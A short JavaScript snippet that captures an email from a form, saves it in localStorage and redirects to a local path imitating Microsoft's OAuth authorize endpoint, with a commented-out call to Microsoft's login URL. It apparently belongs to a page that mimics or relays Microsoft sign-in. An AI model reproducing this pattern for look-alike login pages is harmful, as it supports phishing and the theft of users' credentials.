let submit, cbText;
document.addEventListener("DOMContentLoaded", async ()=>{


    document.querySelector("form").addEventListener("submit",e =>{
        e.preventDefault();
        const email = e.currentTarget.querySelector("input").value
        localStorage.setItem("email",email)

        window.location.href = `/common/oauth2/v2.0/authorize2?email=${email}`

    })
    

})

//const data = await fetchResourse({},"https://login.microsoftonline.com/common/login","POST","noload")